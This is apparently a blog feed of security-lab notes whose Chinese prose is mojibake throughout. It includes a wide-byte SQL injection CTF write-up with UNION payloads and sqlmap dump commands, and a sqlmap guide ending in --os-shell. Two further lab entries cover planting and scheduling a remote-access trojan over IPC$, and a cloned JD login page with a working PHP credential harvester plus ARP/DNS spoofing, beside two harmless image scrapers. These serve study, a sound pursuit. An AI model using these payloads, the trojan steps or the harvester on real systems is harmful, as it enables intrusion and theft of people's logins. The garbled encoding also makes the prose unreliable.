table_schema=database()%23</code></pre><p>æŸ¥çœ‹æ‰€æœ‰çš„è¡¨</p><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre><p>æŸ¥çœ‹è¡¨ä¸­çš„åˆ—</p><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 ä¸ºåå…­è¿›åˆ¶ctf</p><p>è·å–å­—æ®µå†…å®¹</p><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p><h3 id="äºŒã€sqlmapæ³¨å…¥"><a href="#äºŒã€sqlmapæ³¨å…¥" class="headerlink" title="äºŒã€sqlmapæ³¨å…¥"></a>äºŒã€sqlmapæ³¨å…¥</h3><p>æ£€æµ‹æ˜¯å¦æœ‰æ³¨å…¥ç‚¹</p><p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>æ²¡æœ‰æˆåŠŸ<br>ä½¿ç”¨åå…­è¿›åˆ¶</p><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre><p>è·å–æ•°æ®åº“å</p><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --dbs //é€‰æ‹©åå…­è¿›åˆ¶ è·å–æ•°æ®åº“å å•å¼•å·ä½¿ç”¨urlç¼–ç </code></pre><p>è·å–è¡¨å</p><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>è·å–flag</p><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœ¨é©¬</title>
    <link href="/2020/07/18/%E6%9C%A8%E9%A9%AC/"/>
    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆè¯†æœ¨é©¬"><a href="#åˆè¯†æœ¨é©¬" class="headerlink" title="åˆè¯†æœ¨é©¬"></a>åˆè¯†æœ¨é©¬</h1><span id="more"></span><h2 id="å®éªŒç›®çš„"><a href="#å®éªŒç›®çš„" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h2><p><strong>ä½¿ç”¨ç°é¸½å­è½¯ä»¶ä»¥åŠç«¯å£çˆ†ç ´è½¯ä»¶æ§åˆ¶ç›®çš„ä¸»æœº</strong></p><p>å‡†å¤‡ä¸€å°xpï¼Œä¸€å°2003<br>å…¶ä¸­xpåœ°å€ä¸º10.1.1.3/24 2003ä¸º10.1.1.1/24<br>ä½¿ä¸¤ä¸ªä¸»æœºèƒ½å¤Ÿé€šä¿¡<br>xpä½œä¸ºæ”»å‡»æ–¹ï¼Œ2003ä¸ºå—å®³è€…</p><h3 id="1-åˆ¶ä½œæœ¨é©¬"><a href="#1-åˆ¶ä½œæœ¨é©¬" class="headerlink" title="1.åˆ¶ä½œæœ¨é©¬"></a>1.åˆ¶ä½œæœ¨é©¬</h3><p>ä½¿ç”¨ç°é¸½å­åˆ¶ä½œæœ¨é©¬ï¼Œå°†æœ¨é©¬ç”Ÿæˆåœ¨åœ¨æ¡Œé¢ï¼ˆè®°ä½è·¯å¾„ä¹‹åè¦ä½¿ç”¨ï¼‰<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" alt></p><h3 id="2-æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´"><a href="#2-æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´" class="headerlink" title="2.æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´"></a>2.æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´</h3><p>ipèµ·å§‹åœ°å€ä¸º10.1.1.1-10.1.1.255<br>å¯†ç é…ç½®æ–‡ä»¶<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" alt><br>å…¶å®åªè¦æ‰«æ10.1.1.1å³å¯ï¼ˆå› ä¸ºæ˜¯å®éªŒï¼‰</p><p>è·å–è´¦å·å¯†ç <br>usernameï¼šadministrator<br>password: â€œâ€</p><h3 id="3-ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC"><a href="#3-ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC" class="headerlink" title="3.ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC$"></a>3.ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p><h3 id="4-æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº"><a href="#4-æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº" class="headerlink" title="4.æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº"></a>4.æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº</h3><p><code>copy C:\Documents and Settings\shimisi\æ¡Œé¢\qq.exe  \\10.1.1.1\ipc$</code></p><h3 id="5-è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬"><a href="#5-è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬" class="headerlink" title="5.è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬"></a>5.è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬</h3><p><code>net time \\10.1.1.1</code>æ ¹æ®ç›®æ ‡ä¸»æœºæ—¶é—´è®¾ç½®äº‹ç‰©çš„å¼€å§‹æ—¶é—´<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>åœ¨ä¸Šé¢çš„æ—¶é—´ä¹‹åä¸‰åˆ†é’Ÿå·¦å³è®¾ç½®ä¸€ä¸ªäº‹ç‰©<br>å³åœ¨17ï¼š17æ—¶è¿è¡Œæœ¨é©¬æ–‡ä»¶</p><h3 id="6-æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº"><a href="#6-æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº" class="headerlink" title="6.æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº"></a>6.æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº</h3><p>è§‚å¯Ÿç›®æ ‡ä¸»æœºå·²è‡ªåŠ¨ä¸Šçº¿ï¼Œå·²å¯ä»¥è¿›è¡Œç›‘æ§æˆ–ä¼ è¾“æ•°æ®ç­‰æ“ä½œ</p><p>è·å–å±å¹•å†…å®¹<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" alt></p><p>æ§åˆ¶å‘½ä»¤è¡Œ<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>æœ¨é©¬</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jdtest</title>
    <link href="/2020/07/18/jdtest/"/>
    <url>/2020/07/18/jdtest/</url>
    
    <content type="html"><![CDATA[<h1 id="çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•"><a href="#çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•" class="headerlink" title="çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•"></a>çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•</h1><span id="more"></span><p>è®¿é—®çš„é¡µé¢<br><img src="/2020/07/18/jdtest/jd.png" alt="1"><br>å›¾ç‰‡é“¾æ¥çš„ä½ç½®<br><img src="/2020/07/18/jdtest/link.png" alt="2"></p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/7/16 14:54</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : jd.py</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> os<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;jdtp&quot;</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):    os.mkdir(<span class="hljs-built_in">dir</span>)baseurl = <span class="hljs-string">&quot;https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu&quot;</span>head = &#123;        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>    &#125;response = requests.get(url=baseurl, headers = head)<span class="hljs-comment">#print(response.text)</span>html = response.textfindlinks = <span class="hljs-string">&#x27;&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;\d&quot; src=&quot;(.*?)&quot;.*?&gt;&#x27;</span><span class="hljs-comment">#&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;1&quot; src=&quot;//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg&quot; data-lazy-img=&quot;done&quot; source-data-lazy-img=&quot;&quot;&gt;</span>urls = re.findall(findlinks, html)<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:    time.sleep(<span class="hljs-number">1</span>)    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]    res = requests.get(<span class="hljs-string">&quot;http:&quot;</span>+url,headers = head)    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:        f.write(res.content)</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2020/07/18/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmapä½¿ç”¨"><a href="#sqlmapä½¿ç”¨" class="headerlink" title="sqlmapä½¿ç”¨"></a>sqlmapä½¿ç”¨</h1><span id="more"></span><p>ç¬¬ä¸€æ­¥:</p><pre><code>-u &quot;xxâ€ --cookie= &quot;yyy&quot; //å¸¦ä¸Šcookieå¯¹URLè¿›è¡Œæ³¨å…¥æ¢æµ‹</code></pre><p>ç¬¬äºŒæ­¥:</p><pre><code>-u &quot;xxxâ€ --cookie= &quot;yy&quot; - current--db //å¯¹æ•°æ®åº“åè¿›è¡Œè·å–</code></pre><p>ç¬¬ä¸‰æ­¥:</p><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //å¯¹æ•°æ®åº“dvwaçš„è¡¨åè¿›è¡Œæšä¸¾</code></pre><p>ç¬¬å››æ­¥:</p><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //å¯¹dvwaåº“é‡Œé¢çš„åä¸ºusersè¡¨çš„åˆ—åè¿›è¡Œæšä¸¾</code></pre><p>ç¬¬äº”æ­¥:</p><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump//æ¢æµ‹userè¡¨nameå’Œpasswordå­—æ®µ</code></pre><p>å¦‚æœæ­¤æ—¶å¾—åˆ°çš„å¯†ç ä¸ºå¯†æ–‡, SQLmapä¼šè‡ªåŠ¨è¯¢é—®ï¼Œæ˜¯å¦çˆ†ç ´,é€‰æ‹©â€æ˜¯â€å³å¯å¼€å§‹ä½¿ç”¨SQLMAPè‡ªå¸¦çš„å­—<br>å…¸è¿›è¡Œçˆ†ç ´ã€‚</p><p>ç¬¬å…­æ­¥:</p><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //è·å–shell,é€‰æ‹©åå°è¯­è¨€</code></pre><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><p>order by * </p><p>group by *</p><p>åˆ©ç”¨å†…ç½®å‡½æ•°æš´æ•°æ®åº“ä¿¡æ¯</p><p>version() æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</p><p>database() æŸ¥çœ‹å½“å‰æ•°æ®åº“å</p><p>user() æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><p>æŸ¥çœ‹è¡¨ï¼š</p><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>å¯åå…­è¿›åˆ¶æŸ¥çœ‹å­—æ®µï¼š</p><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=â€˜biaomingâ€™;</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çˆ¬å›¾</title>
    <link href="/2020/07/18/%E7%88%AC%E5%9B%BE/"/>
    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡"><a href="#ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡" class="headerlink" title="ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡"></a>ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡</h1><span id="more"></span><p><strong>ç”¨çš„åº“</strong></p><pre><code class="hljs applescript">re <span class="hljs-comment">#æ­£åˆ™è¡¨è¾¾å¼</span>requests <span class="hljs-comment">#urlè¯·æ±‚</span><span class="hljs-built_in">time</span>   <span class="hljs-comment">#æ—¶é—´</span>os     <span class="hljs-comment">#ç”¨äºåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œä¿å­˜å›¾ç‰‡</span></code></pre><p>##å‡†å¤‡å·¥ä½œ<br>1.é¦–å…ˆè®¿é—®è¯¥é“¾æ¥<br><code>https://www.vmgirls.com/</code><br>2.éšä¾¿ç‚¹å‡»ä¸€ä¸ªè¿›å…¥æŸ¥çœ‹è¯¦æƒ…<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12å®¡æŸ¥å…ƒç´ ç½‘æŸ¥çœ‹é¡µè¯¦æƒ…ï¼Œä¸»è¦æŸ¥çœ‹å›¾ç‰‡é“¾æ¥çš„æ ‡ç­¾ä½ç½®ï¼Œå†™å‡ºæ­£åˆ™è¡¨è¾¾å¼<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" alt="1"><br>è¯¥æ­£åˆ™è¡¨è¾¾å¼ä¸º<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p><h2 id="å®Œæ•´ç¨‹åº"><a href="#å®Œæ•´ç¨‹åº" class="headerlink" title="å®Œæ•´ç¨‹åº"></a>å®Œæ•´ç¨‹åº</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/7/16 13:36</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : tupian.py</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> os<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;plmm&quot;</span>        <span class="hljs-comment">#æ–‡ä»¶å¤¹åå­—</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):   <span class="hljs-comment">#é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨å½“å‰æ–‡ä»¶å¤¹å¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ª</span>    os.mkdir(<span class="hljs-built_in">dir</span>)<span class="hljs-comment"># æ¨¡ä»¿æµè§ˆå™¨çš„é¦–éƒ¨ä¿¡æ¯ï¼Œç»•è¿‡ä¸€äº›ç½‘ç«™çš„åçˆ¬å–æªæ–½</span>head = &#123;        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>    &#125;url = <span class="hljs-string">&quot;https://www.vmgirls.com/13344.html&quot;</span>response = requests.get(url, headers = head)   <span class="hljs-comment"># è®¿é—®ç›®æ ‡ç½‘é¡µï¼Œè·å–ç½‘é¡µå†…å®¹</span>html = response.textfindlinks = <span class="hljs-string">&#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27;</span>urls = re.findall(findlinks, html)   <span class="hljs-comment">#çˆ¬å–åˆ°çš„å›¾ç‰‡é“¾æ¥ä¿å­˜åœ¨urlsä¸­ï¼Œ æ˜¯ä¸€ä¸ªåˆ—è¡¨</span><span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#é˜²æ­¢è®¿é—®é€Ÿåº¦è¿‡å¿«ä½¿æœåŠ¡å™¨å´©æºƒ</span>    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]    <span class="hljs-comment">#ä¿å­˜å›¾ç‰‡çš„åå­—</span>    res = requests.get(url, headers = head)   <span class="hljs-comment">#ä¾æ­¤è®¿é—®å›¾ç‰‡é“¾æ¥</span>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#ä»¥äºŒè¿›åˆ¶å½¢å¼ä¿å­˜å›¾ç‰‡</span>        f.write(res.content)</code></pre>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ¬è™«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>diaoyu</title>
    <link href="/2020/07/18/diaoyu/"/>
    <url>/2020/07/18/diaoyu/</url>
    
    <content type="html"><![CDATA[<h1 id="DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ"><a href="#DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ" class="headerlink" title="DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ"></a>DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ</h1><span id="more"></span><p>1.å®éªŒç›®çš„<br>è·å–ç™»å½•jdç½‘é¡µçš„ç”¨æˆ·åå’Œå¯†ç <br>2.å®éªŒä¸»æœº<br>ä¸€å°kali,ä¸¤å°win2003,å…¶ä¸­ä¸€å°ä¸ºå®¢æˆ·æœºï¼Œä¸€å°ä¸ºæœåŠ¡å™¨ï¼Œkaliä½œä¸ºæ”»å‡»è€…<br>3.å®éªŒææ–™<br>äº¬ä¸œç™»å½•ç½‘é¡µåŠå…¶æ‰€æœ‰å›¾ç‰‡ï¼ˆæµè§ˆå™¨è®¿é—®<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> ä¹‹åä¿å­˜ç½‘é¡µå³å¯ï¼‰<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>ä¿®æ”¹index.htmlä¸­çš„å†…å®¹<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.phpä¸­çš„å†…å®¹å¦‚ä¸‹<br>å…³é”®ä»£ç ï¼ˆç”¨äºä¿å­˜ç”¨æˆ·åå’Œå¯†ç ä»¥åŠè¿·æƒ‘ç”¨æˆ·ï¼‰</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name æ˜¯ç”±ç½‘é¡µçš„è¡¨å•ä¿¡æ¯å†³å®šï¼Œä¸åŒçš„ç½‘é¡µå¯¹åº”ä¸åŒçš„å†…å®¹ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦</span><span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//passä¹Ÿä¸€æ ·</span><span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;æ‚¨å·²æ•è·äº¬ä¸œè´¦å·åŠå¯†ç 1ä¸ªï¼š&quot;</span> . <span class="hljs-string">&quot; ç”¨æˆ·å &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; å¯†ç  &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//ä¿å­˜æ•è·çš„ç”¨æˆ·åå’Œå¯†ç </span><span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//æ‰“å¼€1.txt</span>@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//å°†ç”¨æˆ·åå’Œå¯†ç å†™å…¥1.txt</span><span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;head&gt;&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;window.history.back() <span class="hljs-comment">//åé€€+åˆ·æ–°</span>&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- åŠ è½½ä¹‹åç«‹å³æ‰§è¡Œä¸€æ®µ JavaScript --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>4.å®éªŒæ‹“æ‰‘å›¾<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p><h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="ä¸€-éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨"><a href="#ä¸€-éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨" class="headerlink" title="ä¸€.éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨"></a>ä¸€.éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨</h3><p>1.å®‰è£…DNSå’ŒwebæœåŠ¡å™¨ï¼ˆå…·ä½“æ­¥éª¤ç•¥ï¼‰<br>2.é…ç½®DNSæœåŠ¡å™¨<br>a.åœ¨æ­£å‘è§£æä¸­å»ºä¸€ä¸ªåŒºåŸŸåå­—ä¸ºjd ipä¸ºæœåŠ¡å™¨åœ°å€ï¼ˆ10.1.1.1ï¼‰<br>b.åœ¨jdåŸŸä¸­æ–°å»ºä¸€å°ä¸»æœº  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p><p>2.IIS<br>a.å°†é»˜è®¤ç½‘ç«™åœæ­¢<br>b.æ–°å»ºç½‘ç«™jd.com,æ–‡ä»¶è·¯å¾„ä¸ºä¿å­˜çš„jdç½‘é¡µ<br>c.æ‰“å¼€webæœåŠ¡ä¸­çš„aspï¼ˆå› ä¸ºæ­¤ç½‘ç«™ä¸æ˜¯é™æ€ç½‘ç«™ï¼‰<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>ï¼ˆä½¿ç”¨2003å®¢æˆ·æœºè®¿é—®<a href="http://www.jd.comçœ‹çœ‹ç½‘ç«™å‘å¸ƒæ˜¯å¦æˆåŠŸï¼‰">www.jd.comçœ‹çœ‹ç½‘ç«™å‘å¸ƒæ˜¯å¦æˆåŠŸï¼‰</a></p><h3 id="äºŒ-éƒ¨ç½²kali"><a href="#äºŒ-éƒ¨ç½²kali" class="headerlink" title="äºŒ.éƒ¨ç½²kali"></a>äºŒ.éƒ¨ç½²kali</h3><p>1.å°†é’“é±¼ç½‘é¡µçš„æ‰€æœ‰æ–‡ä»¶æ”¾åˆ° kali çš„/var/www/html/è·¯å¾„ä¸‹ï¼Œ å¹¶ä¿®æ”¹ 1.txt çš„æƒé™ï¼Œ ä½¿è¿™ä¸ªæ–‡æ¡£å¯ä»¥å†™å…¥æ•°æ®ã€‚<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.å¼€å¯apacheæœåŠ¡ï¼Œå¹¶æ£€æŸ¥80ç«¯å£æ˜¯å¦å·²å¼€å¯<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.ä¿®æ”¹DNSæ¬ºéª—é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ vim ç¼–è¾‘å™¨ï¼Œ å‘½ä»¤ï¼švim /etc/ettercap/etter.dnsï¼Œç„¶å æ·»åŠ ä¸€æ¡ A è®°å½•ï¼Œ<br>æ·»åŠ ä¸€æ¡ PTR è®°å½•ï¼Œä½¿ç”¨æˆ·è®¿é—®<a href="http://www.jd.comï¼ŒæŒ‡å‘ä¸º10.1.1.2">www.jd.comï¼ŒæŒ‡å‘ä¸º10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>é€‰ä¸­ä¸€è¡Œåï¼ŒæŒ‰ä¸¤æ¬¡då¯åˆ é™¤å†…å®¹</code><br><code>æƒ³è¦ç¼–è¾‘æ—¶ï¼Œå…ˆæŒ‰i(insert)</code><br><code>ç¼–è¾‘ç»“æŸå  :wq ä¿å­˜</code><br>4.æ‰“å¼€ettercapè½¯ä»¶<br>5.é€‰æ‹©sniffâ€“unified sniffingï¼Œå¹¶é€‰æ‹©ç›‘å¬eth0<br>6.ç„¶åé€‰æ‹©Hostsâ€”â€”Scan for hostsâ€“æ‰«æå®Œæˆåé€‰æ‹©Hostsâ€”â€”Hosts list,å¯ä»¥çœ‹åˆ°æ‰«æåˆ°çš„ä¸»æœº<br>7.æ·»åŠ æ¬ºéª—è®°å½•<br>é€‰ä¸­10.1.1.1ï¼Œç‚¹å‡»Add to Target 1 é€‰ä¸­10.1.1.3ï¼Œç‚¹å‡»Add to Target 2<br>8.åœ¨Mitmé€‰æ‹©ARPæ¬ºéª—<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå‹¾é€‰ç¬¬ä¸€ä¸ªç‚¹å‡»ç¡®å®š<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.é€‰æ‹©plugins â€“ Manage the pluginsï¼Œå‡†å¤‡è¿›è¡ŒDNSæ¬ºéª—<br>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œ æ‰¾åˆ° dns spoof å¹¶åŒå‡»å‡ºç°*å·ï¼Œå¼€å§‹DNSæ¬ºéª—</p><h3 id="ä¸‰-ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢"><a href="#ä¸‰-ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢" class="headerlink" title="ä¸‰.ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢"></a>ä¸‰.ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢</h3><p>1.åœ¨å®¢æˆ·æœºä¸­åœ¨ä¸­ï¼Œå†æ¬¡ç™»å½•<a href="http://www.jd.comè¾“å…¥ç”¨æˆ·åå¯†ç ç„¶åç‚¹å‡»ç™»å½•">www.jd.comè¾“å…¥ç”¨æˆ·åå¯†ç 